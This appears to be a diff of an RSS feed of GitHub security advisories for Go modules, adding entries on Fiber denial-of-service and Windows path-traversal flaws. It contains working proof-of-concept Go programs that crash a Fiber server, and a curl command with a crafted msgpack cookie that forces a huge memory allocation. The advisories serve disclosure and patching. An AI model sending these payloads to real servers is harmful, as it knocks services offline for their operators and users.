@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-02-24T20:48:30.632Z</updated>
+    <updated>2026-02-24T21:20:34.936Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,684 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/gofiber/fiber/v3] Fiber has a Denial of Service Vulnerability via Route Parameter Overflow]]></title>
+        <id>https://github.com/advisories/GHSA-mrq8-rjmw-wpq3</id>
+        <link href="https://github.com/advisories/GHSA-mrq8-rjmw-wpq3"/>
+        <updated>2026-02-24T21:04:08.000Z</updated>
+        <content type="html"><![CDATA[<p>A denial of service vulnerability exists in Fiber v2 and v3 that allows remote attackers to crash the application by sending requests to routes with more than 30 parameters. The vulnerability results from missing validation during route registration combined with an unbounded array write during request matching.</p>
+<h2 id="affected-versions">Affected Versions</h2>
+<ul>
+<li><strong>Fiber v3.0.0-rc.3</strong> and earlier v3 releases</li>
+<li><strong>Fiber v2.52.10</strong> and potentially all v2 releases (confirmed exploitable)</li>
+<li>Both versions share the same vulnerable routing implementation</li>
+</ul>
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+<h3 id="root-cause">Root Cause</h3>
+<p>Both Fiber v2 and v3 define a fixed-size parameter array in <code>ctx.go</code>:</p>
+<pre><code class="language-go">const maxParams = 30
+
+type DefaultCtx struct {
+    values [maxParams]string  // Fixed 30-element array
+    // ...
+}
+</code></pre>
+<p>The <code>router.go</code> <code>register()</code> function accepts routes without validating parameter count. When a request matches a route exceeding 30 parameters, the code in <code>path.go</code> performs an unbounded write:</p>
+<ul>
+<li><strong>v3</strong>: <code>path.go:514</code></li>
+<li><strong>v2</strong>: <code>path.go:516</code></li>
+</ul>
+<pre><code class="language-go">// path.go:514 - NO BOUNDS CHECKING
+params[paramsIterator] = path[:i]
+</code></pre>
+<p>When <code>paramsIterator &gt;= 30</code>, this triggers:</p>
+<pre><code>panic: runtime error: index out of range [30] with length 30
+</code></pre>
+<h3 id="attack-scenario">Attack Scenario</h3>
+<ol>
+<li><p>Application registers route with &gt;30 parameters (e.g., via code or dynamic routing):</p>
+<pre><code class="language-go">app.Get("/api/:p1/:p2/:p3/.../p35", handler)
+</code></pre>
+</li>
+<li><p>Attacker sends matching HTTP request:</p>
+<pre><code class="language-bash">curl http://target/api/v1/v2/v3/.../v35
+</code></pre>
+</li>
+<li><p>Server crashes during request processing with runtime panic</p>
+</li>
+</ol>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<h3 id="for-fiber-v3">For Fiber v3</h3>
+<pre><code class="language-go">package main
+
+import (
+    "fmt"
+    "net/http"
+    "time"
+    "github.com/gofiber/fiber/v3"
+)
+
+func main() {
+    app := fiber.New()
+    
+    // Register route with 35 parameters (exceeds maxParams=30)
+    path := "/test"
+    for i := 1; i &lt;= 35; i++ {
+        path += fmt.Sprintf("/:p%d", i)
+    }
+    
+    fmt.Printf("Registering route: %s...\n", path[:50]+"...")
+    app.Get(path, func(c fiber.Ctx) error {
+        return c.SendString("Never reached")
+    })
+    fmt.Println("✓ Registration succeeded (NO PANIC)")
+    
+    go func() {
+        app.Listen(":9999")
+    }()
+    time.Sleep(200 * time.Millisecond)
+    
+    // Build exploit URL with 35 parameter values
+    url := "http://localhost:9999/test"
+    for i := 1; i &lt;= 35; i++ {
+        url += fmt.Sprintf("/v%d", i)
+    }
+    
+    fmt.Println("\n🔴 Sending exploit request...")
+    fmt.Println("Expected: panic at path.go:514 params[paramsIterator] = path[:i]\n")
+    
+    resp, err := http.Get(url)
+    if err != nil {
+        fmt.Printf("✗ Request failed: %v\n", err)
+        fmt.Println("💥 Server crashed!")
+    } else {
+        fmt.Printf("Response: %d\n", resp.StatusCode)
+        resp.Body.Close()
+    }
+}
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>Registering route: /test/:p1/:p2/:p3/:p4/:p5/:p6/:p7/:p8/:p9/:p10...
+✓ Registration succeeded (NO PANIC)
+
+🔴 Sending exploit request...
+Expected: panic at path.go:514 params[paramsIterator] = path[:i]
+
+panic: runtime error: index out of range [30] with length 30
+
+goroutine 40 [running]:
+github.com/gofiber/fiber/v3.(*routeParser).getMatch(...)
+    /path/to/fiber/path.go:514
+github.com/gofiber/fiber/v3.(*Route).match(...)
+    /path/to/fiber/router.go:89
+github.com/gofiber/fiber/v3.(*App).next(...)
+    /path/to/fiber/router.go:142
+</code></pre>
+<h3 id="for-fiber-v2">For Fiber v2</h3>
+<pre><code class="language-go">package main
+
+import (
+    "fmt"
+    "net/http"
+    "time"
+    "github.com/gofiber/fiber/v2"
+)
+
+func main() {
+    app := fiber.New()
+    
+    // Register route with 35 parameters (exceeds maxParams=30)
+    path := "/test"
+    for i := 1; i &lt;= 35; i++ {
+        path += fmt.Sprintf("/:p%d", i)
+    }
+    
+    fmt.Printf("Registering route: %s...\n", path[:50]+"...")
+    app.Get(path, func(c *fiber.Ctx) error {
+        return c.SendString("Never reached")
+    })
+    fmt.Println("✓ Registration succeeded (NO PANIC)")
+    
+    go func() {
+        app.Listen(":9998")
+    }()
+    time.Sleep(200 * time.Millisecond)
+    
+    // Build exploit URL with 35 parameter values
+    url := "http://localhost:9998/test"
+    for i := 1; i &lt;= 35; i++ {
+        url += fmt.Sprintf("/v%d", i)
+    }
+    
+    fmt.Println("\n🔴 Sending exploit request...")
+    fmt.Println("Expected: panic at path.go:516 params[paramsIterator] = path[:i]\n")
+    
+    resp, err := http.Get(url)
+    if err != nil {
+        fmt.Printf("✗ Request failed: %v\n", err)
+        fmt.Println("💥 Server crashed!")
+    } else {
+        fmt.Printf("Response: %d\n", resp.StatusCode)
+        resp.Body.Close()
+    }
+}
+</code></pre>
+<p><strong>Output (v2):</strong></p>
+<pre><code>Registering route: /test/:p1/:p2/:p3/:p4/:p5/:p6/:p7/:p8/:p9/:p10...
+✓ Registration succeeded (NO PANIC)
+
+🔴 Sending exploit request...
+Expected: panic at path.go:516 params[paramsIterator] = path[:i]
+
+panic: runtime error: index out of range [30] with length 30
+
+goroutine 40 [running]:
+github.com/gofiber/fiber/v2.(*routeParser).getMatch(...)
+    /path/to/fiber/v2@v2.52.10/path.go:512
+github.com/gofiber/fiber/v2.(*Route).match(...)
+    /path/to/fiber/v2@v2.52.10/router.go:84
+github.com/gofiber/fiber/v2.(*App).next(...)
+    /path/to/fiber/v2@v2.52.10/router.go:127
+</code></pre>
+<h2 id="impact">Impact</h2>
+<h3 id="exploitation-requirements">Exploitation Requirements</h3>
+<ul>
+<li>No authentication required</li>
+<li>Single HTTP request triggers crash</li>
+<li>Trivially scriptable for sustained DoS</li>
+<li>Works against any route with &gt;30 parameters</li>
+</ul>
+<h3 id="real-world-impact">Real-World Impact</h3>
+<ul>
+<li><strong>Public APIs</strong>: Remote DoS attacks on vulnerable endpoints</li>
+<li><strong>Microservices</strong>: Cascade failures if vulnerable service is critical</li>
+<li><strong>Auto-scaling</strong>: Repeated crashes prevent proper recovery</li>
+<li><strong>Monitoring</strong>: Log flooding and alert fatigue</li>
+</ul>
+<h3 id="likelihood">Likelihood</h3>
+<p><strong>HIGH</strong> - Exploitation requires only:</p>
+<ul>
+<li>Knowledge of route structure (often public in APIs)</li>
+<li>Standard HTTP client (curl, browser, etc.)</li>
+<li>Single malformed request</li>
+</ul>
+<h2 id="workarounds">Workarounds</h2>
+<p>Until patched, users should:</p>
+<ol>
+<li><p><strong>Audit Routes</strong>: Ensure all routes have ≤30 parameters</p>
+<pre><code class="language-bash"># Search for potential issues
+grep -r "/:.*/:.*/:.*" . | grep -v node_modules
+</code></pre>
+</li>
+<li><p><strong>Disable Dynamic Routing</strong>: If programmatically registering routes, validate parameter count:</p>
+<pre><code class="language-go">paramCount := strings.Count(route, ":")
+if paramCount &gt; 30 {
+    log.Fatal("Route exceeds maxParams")
+}
+</code></pre>
+</li>
+<li><p><strong>Rate Limiting</strong>: Deploy aggressive rate limiting to mitigate DoS impact</p>
+</li>
+<li><p><strong>Monitoring</strong>: Alert on panic patterns in application logs</p>
+</li>
+</ol>
+<h2 id="timeline">Timeline</h2>
+<ul>
+<li><strong>2024-12-24</strong>: Vulnerability discovered in v3 during PR #3962 review</li>
+<li><strong>2024-12-25</strong>: Proof of concept confirmed exploitability in v3</li>
+<li><strong>2024-12-25</strong>: Vulnerability confirmed to also exist in v2 (same root cause)</li>
+<li><strong>2024-12-25</strong>: Security advisory created</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><strong>v3 Related PR</strong>: <a href="https://github.com/gofiber/fiber/pull/3962">https://github.com/gofiber/fiber/pull/3962</a> (UpdateParam feature with defensive checks, doesn't fix root cause)</li>
+<li><strong>Vulnerable Code Locations</strong>:<ul>
+<li>v3: <a href="https://github.com/gofiber/fiber/blob/main/path.go#L514">path.go:514</a></li>
+<li>v2: <a href="https://github.com/gofiber/fiber/blob/v2/path.go#L516">path.go:516</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="credit">Credit</h2>
+<p><strong>Discovered by:</strong> @sixcolors (Fiber maintainer) and @TheAspectDev</p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/gofiber/fiber/security/advisories/GHSA-mrq8-rjmw-wpq3">https://github.com/gofiber/fiber/security/advisories/GHSA-mrq8-rjmw-wpq3</a></li>
+<li><a href="https://github.com/gofiber/fiber/pull/3962">https://github.com/gofiber/fiber/pull/3962</a></li>
+<li><a href="https://github.com/gofiber/fiber/blob/main/path.go#L514">https://github.com/gofiber/fiber/blob/main/path.go#L514</a></li>
+<li><a href="https://github.com/gofiber/fiber/blob/v2/path.go#L516">https://github.com/gofiber/fiber/blob/v2/path.go#L516</a></li>
+<li><a href="https://github.com/advisories/GHSA-mrq8-rjmw-wpq3">https://github.com/advisories/GHSA-mrq8-rjmw-wpq3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mrq8-rjmw-wpq3</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-24T21:04:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/gofiber/fiber/v2] Fiber has a Denial of Service Vulnerability via Route Parameter Overflow]]></title>
+        <id>https://github.com/advisories/GHSA-mrq8-rjmw-wpq3</id>
+        <link href="https://github.com/advisories/GHSA-mrq8-rjmw-wpq3"/>
+        <updated>2026-02-24T21:04:08.000Z</updated>
+        <content type="html"><![CDATA[<p>A denial of service vulnerability exists in Fiber v2 and v3 that allows remote attackers to crash the application by sending requests to routes with more than 30 parameters. The vulnerability results from missing validation during route registration combined with an unbounded array write during request matching.</p>
+<h2 id="affected-versions">Affected Versions</h2>
+<ul>
+<li><strong>Fiber v3.0.0-rc.3</strong> and earlier v3 releases</li>
+<li><strong>Fiber v2.52.10</strong> and potentially all v2 releases (confirmed exploitable)</li>
+<li>Both versions share the same vulnerable routing implementation</li>
+</ul>
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+<h3 id="root-cause">Root Cause</h3>
+<p>Both Fiber v2 and v3 define a fixed-size parameter array in <code>ctx.go</code>:</p>
+<pre><code class="language-go">const maxParams = 30
+
+type DefaultCtx struct {
+    values [maxParams]string  // Fixed 30-element array
+    // ...
+}
+</code></pre>
+<p>The <code>router.go</code> <code>register()</code> function accepts routes without validating parameter count. When a request matches a route exceeding 30 parameters, the code in <code>path.go</code> performs an unbounded write:</p>
+<ul>
+<li><strong>v3</strong>: <code>path.go:514</code></li>
+<li><strong>v2</strong>: <code>path.go:516</code></li>
+</ul>
+<pre><code class="language-go">// path.go:514 - NO BOUNDS CHECKING
+params[paramsIterator] = path[:i]
+</code></pre>
+<p>When <code>paramsIterator &gt;= 30</code>, this triggers:</p>
+<pre><code>panic: runtime error: index out of range [30] with length 30
+</code></pre>
+<h3 id="attack-scenario">Attack Scenario</h3>
+<ol>
+<li><p>Application registers route with &gt;30 parameters (e.g., via code or dynamic routing):</p>
+<pre><code class="language-go">app.Get("/api/:p1/:p2/:p3/.../p35", handler)
+</code></pre>
+</li>
+<li><p>Attacker sends matching HTTP request:</p>
+<pre><code class="language-bash">curl http://target/api/v1/v2/v3/.../v35
+</code></pre>
+</li>
+<li><p>Server crashes during request processing with runtime panic</p>
+</li>
+</ol>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<h3 id="for-fiber-v3">For Fiber v3</h3>
+<pre><code class="language-go">package main
+
+import (
+    "fmt"
+    "net/http"
+    "time"
+    "github.com/gofiber/fiber/v3"
+)
+
+func main() {
+    app := fiber.New()
+    
+    // Register route with 35 parameters (exceeds maxParams=30)
+    path := "/test"
+    for i := 1; i &lt;= 35; i++ {
+        path += fmt.Sprintf("/:p%d", i)
+    }
+    
+    fmt.Printf("Registering route: %s...\n", path[:50]+"...")
+    app.Get(path, func(c fiber.Ctx) error {
+        return c.SendString("Never reached")
+    })
+    fmt.Println("✓ Registration succeeded (NO PANIC)")
+    
+    go func() {
+        app.Listen(":9999")
+    }()
+    time.Sleep(200 * time.Millisecond)
+    
+    // Build exploit URL with 35 parameter values
+    url := "http://localhost:9999/test"
+    for i := 1; i &lt;= 35; i++ {
+        url += fmt.Sprintf("/v%d", i)
+    }
+    
+    fmt.Println("\n🔴 Sending exploit request...")
+    fmt.Println("Expected: panic at path.go:514 params[paramsIterator] = path[:i]\n")
+    
+    resp, err := http.Get(url)
+    if err != nil {
+        fmt.Printf("✗ Request failed: %v\n", err)
+        fmt.Println("💥 Server crashed!")
+    } else {
+        fmt.Printf("Response: %d\n", resp.StatusCode)
+        resp.Body.Close()
+    }
+}
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>Registering route: /test/:p1/:p2/:p3/:p4/:p5/:p6/:p7/:p8/:p9/:p10...
+✓ Registration succeeded (NO PANIC)
+
+🔴 Sending exploit request...
+Expected: panic at path.go:514 params[paramsIterator] = path[:i]
+
+panic: runtime error: index out of range [30] with length 30
+
+goroutine 40 [running]:
+github.com/gofiber/fiber/v3.(*routeParser).getMatch(...)
+    /path/to/fiber/path.go:514
+github.com/gofiber/fiber/v3.(*Route).match(...)
+    /path/to/fiber/router.go:89
+github.com/gofiber/fiber/v3.(*App).next(...)
+    /path/to/fiber/router.go:142
+</code></pre>
+<h3 id="for-fiber-v2">For Fiber v2</h3>
+<pre><code class="language-go">package main
+
+import (
+    "fmt"
+    "net/http"
+    "time"
+    "github.com/gofiber/fiber/v2"
+)
+
+func main() {
+    app := fiber.New()
+    
+    // Register route with 35 parameters (exceeds maxParams=30)
+    path := "/test"
+    for i := 1; i &lt;= 35; i++ {
+        path += fmt.Sprintf("/:p%d", i)
+    }
+    
+    fmt.Printf("Registering route: %s...\n", path[:50]+"...")
+    app.Get(path, func(c *fiber.Ctx) error {
+        return c.SendString("Never reached")
+    })
+    fmt.Println("✓ Registration succeeded (NO PANIC)")
+    
+    go func() {
+        app.Listen(":9998")
+    }()
+    time.Sleep(200 * time.Millisecond)
+    
+    // Build exploit URL with 35 parameter values
+    url := "http://localhost:9998/test"
+    for i := 1; i &lt;= 35; i++ {
+        url += fmt.Sprintf("/v%d", i)
+    }
+    
+    fmt.Println("\n🔴 Sending exploit request...")
+    fmt.Println("Expected: panic at path.go:516 params[paramsIterator] = path[:i]\n")
+    
+    resp, err := http.Get(url)
+    if err != nil {
+        fmt.Printf("✗ Request failed: %v\n", err)
+        fmt.Println("💥 Server crashed!")
+    } else {
+        fmt.Printf("Response: %d\n", resp.StatusCode)
+        resp.Body.Close()
+    }
+}
+</code></pre>
+<p><strong>Output (v2):</strong></p>
+<pre><code>Registering route: /test/:p1/:p2/:p3/:p4/:p5/:p6/:p7/:p8/:p9/:p10...
+✓ Registration succeeded (NO PANIC)
+
+🔴 Sending exploit request...
+Expected: panic at path.go:516 params[paramsIterator] = path[:i]
+
+panic: runtime error: index out of range [30] with length 30
+
+goroutine 40 [running]:
+github.com/gofiber/fiber/v2.(*routeParser).getMatch(...)
+    /path/to/fiber/v2@v2.52.10/path.go:512
+github.com/gofiber/fiber/v2.(*Route).match(...)
+    /path/to/fiber/v2@v2.52.10/router.go:84
+github.com/gofiber/fiber/v2.(*App).next(...)
+    /path/to/fiber/v2@v2.52.10/router.go:127
+</code></pre>
+<h2 id="impact">Impact</h2>
+<h3 id="exploitation-requirements">Exploitation Requirements</h3>
+<ul>
+<li>No authentication required</li>
+<li>Single HTTP request triggers crash</li>
+<li>Trivially scriptable for sustained DoS</li>
+<li>Works against any route with &gt;30 parameters</li>
+</ul>
+<h3 id="real-world-impact">Real-World Impact</h3>
+<ul>
+<li><strong>Public APIs</strong>: Remote DoS attacks on vulnerable endpoints</li>
+<li><strong>Microservices</strong>: Cascade failures if vulnerable service is critical</li>
+<li><strong>Auto-scaling</strong>: Repeated crashes prevent proper recovery</li>
+<li><strong>Monitoring</strong>: Log flooding and alert fatigue</li>
+</ul>
+<h3 id="likelihood">Likelihood</h3>
+<p><strong>HIGH</strong> - Exploitation requires only:</p>
+<ul>
+<li>Knowledge of route structure (often public in APIs)</li>
+<li>Standard HTTP client (curl, browser, etc.)</li>
+<li>Single malformed request</li>
+</ul>
+<h2 id="workarounds">Workarounds</h2>
+<p>Until patched, users should:</p>
+<ol>
+<li><p><strong>Audit Routes</strong>: Ensure all routes have ≤30 parameters</p>
+<pre><code class="language-bash"># Search for potential issues
+grep -r "/:.*/:.*/:.*" . | grep -v node_modules
+</code></pre>
+</li>
+<li><p><strong>Disable Dynamic Routing</strong>: If programmatically registering routes, validate parameter count:</p>
+<pre><code class="language-go">paramCount := strings.Count(route, ":")
+if paramCount &gt; 30 {
+    log.Fatal("Route exceeds maxParams")
+}
+</code></pre>
+</li>
+<li><p><strong>Rate Limiting</strong>: Deploy aggressive rate limiting to mitigate DoS impact</p>
+</li>
+<li><p><strong>Monitoring</strong>: Alert on panic patterns in application logs</p>
+</li>
+</ol>
+<h2 id="timeline">Timeline</h2>
+<ul>
+<li><strong>2024-12-24</strong>: Vulnerability discovered in v3 during PR #3962 review</li>
+<li><strong>2024-12-25</strong>: Proof of concept confirmed exploitability in v3</li>
+<li><strong>2024-12-25</strong>: Vulnerability confirmed to also exist in v2 (same root cause)</li>
+<li><strong>2024-12-25</strong>: Security advisory created</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><strong>v3 Related PR</strong>: <a href="https://github.com/gofiber/fiber/pull/3962">https://github.com/gofiber/fiber/pull/3962</a> (UpdateParam feature with defensive checks, doesn't fix root cause)</li>
+<li><strong>Vulnerable Code Locations</strong>:<ul>
+<li>v3: <a href="https://github.com/gofiber/fiber/blob/main/path.go#L514">path.go:514</a></li>
+<li>v2: <a href="https://github.com/gofiber/fiber/blob/v2/path.go#L516">path.go:516</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="credit">Credit</h2>
+<p><strong>Discovered by:</strong> @sixcolors (Fiber maintainer) and @TheAspectDev</p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/gofiber/fiber/security/advisories/GHSA-mrq8-rjmw-wpq3">https://github.com/gofiber/fiber/security/advisories/GHSA-mrq8-rjmw-wpq3</a></li>
+<li><a href="https://github.com/gofiber/fiber/pull/3962">https://github.com/gofiber/fiber/pull/3962</a></li>
+<li><a href="https://github.com/gofiber/fiber/blob/main/path.go#L514">https://github.com/gofiber/fiber/blob/main/path.go#L514</a></li>
+<li><a href="https://github.com/gofiber/fiber/blob/v2/path.go#L516">https://github.com/gofiber/fiber/blob/v2/path.go#L516</a></li>
+<li><a href="https://github.com/advisories/GHSA-mrq8-rjmw-wpq3">https://github.com/advisories/GHSA-mrq8-rjmw-wpq3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mrq8-rjmw-wpq3</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-24T21:04:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/gofiber/fiber/v3] Fiber is Vulnerable to Denial of Service via Flash Cookie Unbounded Allocation]]></title>
+        <id>https://github.com/advisories/GHSA-2mr3-m5q5-wgp6</id>
+        <link href="https://github.com/advisories/GHSA-2mr3-m5q5-wgp6"/>
+        <updated>2026-02-24T20:57:27.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The use of the <code>fiber_flash</code> cookie can force an unbounded allocation on any server. A crafted 10-character cookie value triggers an attempt to allocate up to 85GB of memory via unvalidated msgpack deserialization. No authentication is required. Every GoFiber v3 endpoint is affected regardless of whether the application uses flash messages.</p>
+<h3 id="details">Details</h3>
+<p>Regardless of configuration, the flash cookie is checked:</p>
+<pre><code class="language-go">func (app *App) requestHandler(rctx *fasthttp.RequestCtx) {
+    // Acquire context from the pool
+    ctx := app.AcquireCtx(rctx)
+    defer app.ReleaseCtx(ctx)
+
+        // Optional: Check flash messages
+        rawHeaders := d.Request().Header.RawHeaders()
+        if len(rawHeaders) &gt; 0 &amp;&amp; bytes.Contains(rawHeaders, flashCookieNameBytes) {
+            d.Redirect().parseAndClearFlashMessages()
+        }
+        _, err = app.next(d)
+    } else {
+        // Check if the HTTP method is valid
+        if ctx.getMethodInt() == -1 {
+            _ = ctx.SendStatus(StatusNotImplemented) //nolint:errcheck // Always return nil
+            return
+        }
+
+        // Optional: Check flash messages
+        rawHeaders := ctx.Request().Header.RawHeaders()
+        if len(rawHeaders) &gt; 0 &amp;&amp; bytes.Contains(rawHeaders, flashCookieNameBytes) {
+            ctx.Redirect().parseAndClearFlashMessages()
+        }
+}
+</code></pre>
+<p>The cookie value is hex-decoded and passed directly to msgpack deserialization with no size or content validation:</p>
+<p><a href="https://github.com/gofiber/fiber/blob/f8f34f642fb3682c341ede7816e7cf861aa7df89/redirect.go#L371">https://github.com/gofiber/fiber/blob/f8f34f642fb3682c341ede7816e7cf861aa7df89/redirect.go#L371</a></p>
+<pre><code class="language-go">// parseAndClearFlashMessages is a method to get flash messages before they are getting removed
+func (r *Redirect) parseAndClearFlashMessages() {
+    // parse flash messages
+    cookieValue, err := hex.DecodeString(r.c.Cookies(FlashCookieName))
+    if err != nil {
+        return
+    }
+
+    _, err = r.c.flashMessages.UnmarshalMsg(cookieValue)
+    if err != nil {
+        return
+    }
+
+    r.c.Cookie(&amp;Cookie{
+        Name:   FlashCookieName,
+        Value:  "",
+        Path:   "/",
+        MaxAge: -1,
+    })
+}
+</code></pre>
+<p>The auto-generated <code>tinylib/msgp</code> deserialization reads a <code>uint32</code> array header from the attacker-controlled byte stream and passes it directly to <code>make()</code> with no bounds check:</p>
+<p><a href="https://github.com/gofiber/fiber/blob/f8f34f642fb3682c341ede7816e7cf861aa7df89/redirect_msgp.go#L242">https://github.com/gofiber/fiber/blob/f8f34f642fb3682c341ede7816e7cf861aa7df89/redirect_msgp.go#L242</a></p>
+<pre><code class="language-go">// UnmarshalMsg implements msgp.Unmarshaler
+func (z *redirectionMsgs) UnmarshalMsg(bts []byte) (o []byte, err error) {
+    var zb0002 uint32
+    zb0002, bts, err = msgp.ReadArrayHeaderBytes(bts)
+    if err != nil {
+        err = msgp.WrapError(err)
+        return o, err
+    }
+    if cap((*z)) &gt;= int(zb0002) {
+        (*z) = (*z)[:zb0002]
+    } else {
+        (*z) = make(redirectionMsgs, zb0002)
+    }
+    for zb0001 := range *z {
+        bts, err = (*z)[zb0001].UnmarshalMsg(bts)
+        if err != nil {
+            err = msgp.WrapError(err, zb0001)
+            return o, err
+        }
+    }
+    o = bts
+    return o, err
+}
+</code></pre>
+<p>where
+ <code>zb0002, bts, err = msgp.ReadArrayHeaderBytes(bts)</code> translates the attacker-controlled value into the element count and <code>make(redirectionMsgs, zb0002)</code> performs the unbounded allocation</p>
+<p>So we can craft a gofiber cookie that will force a huge allocation: 
+<code>curl -H "Cookie: fiber_flash=dd7fffffff" http://localhost:5000/hello</code></p>
+<p>The cookie val is a hex-encoded msgpack array32 header:</p>
+<ul>
+<li><code>dd</code> = msgpack array32 marker</li>
+<li><code>7fffffff</code> = 2 147 483 647 elements</li>
+</ul>
+<h3 id="impact">Impact</h3>
+<p>Unauthenticated remote Denial of Service (CWE-789). Anyone running a gofiber v3.0.0 or v3 server is affected. The flash cookie parsing is hardcoded.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gofiber/fiber/security/advisories/GHSA-2mr3-m5q5-wgp6">https://github.com/gofiber/fiber/security/advisories/GHSA-2mr3-m5q5-wgp6</a></li>
+<li><a href="https://github.com/gofiber/fiber/releases/tag/v3.1.0">https://github.com/gofiber/fiber/releases/tag/v3.1.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-2mr3-m5q5-wgp6">https://github.com/advisories/GHSA-2mr3-m5q5-wgp6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2mr3-m5q5-wgp6</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-24T20:57:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/gofiber/fiber/v3] Fiber has an Arbitrary File Read in Static Middleware on Windows]]></title>
+        <id>https://github.com/advisories/GHSA-m3c2-496v-cw3v</id>
+        <link href="https://github.com/advisories/GHSA-m3c2-496v-cw3v"/>
+        <updated>2026-02-24T20:51:02.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><strong>Description</strong>
+A Path Traversal (CWE-22) vulnerability in Fiber allows a remote attacker to bypass the static middleware sanitizer and read arbitrary files on the server file system on Windows. This affects Fiber v3 through version 3.0.0. This has been patched in Fiber v3 version 3.1.0.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability resides in <code>middleware/static/static.go</code> within the <code>sanitizePath</code> function. This function attempts to sanitize the requested path by checking for backslashes, decoding the URL, and then cleaning the path.</p>
+<p>The vulnerability stems from two combined issues:</p>
+<ul>
+<li>The check for backslash characters happens before the URL decoding loop. If an attacker sends a double-encoded backslash, the initial check sees <code>%255C</code> and passes. The loop then decodes this into a single backslash.</li>
+<li>The function uses <code>path.Clean</code> to clean the resulting string. <code>path.Clean</code> is designed for slash-separated paths  and does not recognize backslashes as directory separators. Consequently, sequences like <code>..\..\</code> are treated as valid filenames.</li>
+</ul>
+<p>When this sanitized path is later used, the backslashes are interpreted as valid separators, allowing the attacker to traverse up the directory tree.</p>
+<pre><code class="language-go">// pkg/static/static.go
+func sanitizePath(p []byte, filesystem fs.FS) ([]byte, error) {
+    ...
+    // this check happens BEFORE decoding
+    if bytes.IndexByte(p, '\\') &gt;= 0 {
+        ...
+    } 
+    // This loop decodes %255C to %5C to \
+    for strings.IndexByte(s, '%') &gt;= 0 {
+        us, err := url.PathUnescape(s)
+        ...
+        s = us
+    }
+    // path.Clean only understands forward slashes (/)
+    s = pathpkg.Clean("/" + s)
+    ...
+    return utils.UnsafeBytes(s), nil
+}
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This impacts Fiber v3 prereleases through stable release version 3.0.0.</p>
+<p>Successful exploitation requires the server to be using the static middleware on Windows, as this is the only OS where backslashes are treated as directory separators by the file system.</p>
+<p>Exploitation allows directory traversal on the host server. An attacker can read arbitrary files within the scope of the application server context. Depending on permissions and deployment conditions, attackers may access sensitive files outside the web root, such as configuration files, source code, or system files. Leaking application secrets often leads to further compromise.</p>
+<h3 id="patches">Patches</h3>
+<p>This has been <a href="https://github.com/gofiber/fiber/pull/4064">patched</a> in Fiber v3 version 3.0.1.  Users are strongly encouraged to update to the latest available release.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gofiber/fiber/security/advisories/GHSA-m3c2-496v-cw3v">https://github.com/gofiber/fiber/security/advisories/GHSA-m3c2-496v-cw3v</a></li>
+<li><a href="https://github.com/gofiber/fiber/pull/4064">https://github.com/gofiber/fiber/pull/4064</a></li>
+<li><a href="https://github.com/gofiber/fiber/commit/59133702301c2ab7b776dd123b474cbd995f2c86">https://github.com/gofiber/fiber/commit/59133702301c2ab7b776dd123b474cbd995f2c86</a></li>
+<li><a href="https://github.com/advisories/GHSA-m3c2-496v-cw3v">https://github.com/advisories/GHSA-m3c2-496v-cw3v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m3c2-496v-cw3v</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-24T20:51:01.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/caddyserver/caddy/v2/modules/caddyhttp/reverseproxy/fastcgi] Caddy: Unicode case-folding length expansion causes incorrect split_path index in FastCGI transport]]></title>
         <id>https://github.com/advisories/GHSA-5r3v-vc8m-m96g</id>
@@ -1543,105 +2221,5 @@ err = DB.WithContext(ctx).Where(...).Find(&amp;tokens).Error
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-02-19T22:07:13.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/dagu-org/dagu] Dagu affected by unauthenticated RCE via inline DAG spec in default configuration]]></title>
-        <id>https://github.com/advisories/GHSA-6qr9-g2xw-cw92</id>
